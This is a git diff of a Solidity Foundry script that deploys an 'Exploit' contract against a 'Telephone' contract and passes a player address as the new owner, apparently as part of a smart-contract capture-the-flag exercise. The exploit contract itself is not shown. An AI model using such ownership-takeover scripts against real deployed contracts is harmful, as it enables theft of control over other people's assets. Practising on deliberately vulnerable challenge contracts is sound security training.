@@ -6,22 +6,15 @@ import {Exploit} from "../src/Telephone.e.sol";
 import {Telephone} from "../src/Telephone.sol";
 
 contract TelephoneScript is Script {
-    Exploit public exploitContract;
-    uint256 deployerPrivateKey = vm.envUint("PK");
-    address telephoneContractAddress = vm.envAddress("TARGET_CONTRACT_ADDRESS");
+    address targetAddress = vm.envAddress("TARGET_CONTRACT_ADDRESS");
     address newOwner = vm.envAddress("PLAYER_ADDRESS");
 
-    function setUp() public {
-        console.log("Script owner", address(this));
-    }
+    Telephone public target = Telephone(targetAddress);
 
     function run() public {
-        vm.startBroadcast(deployerPrivateKey);
+        vm.startBroadcast(vm.envUint("PK"));
 
-        exploitContract = new Exploit(telephoneContractAddress);
-
-        // exploitContract.exploit(newOwner);
-        console.log("Exploit is deployed at", address(exploitContract));
+        new Exploit(target, newOwner);
 
         vm.stopBroadcast();
     }
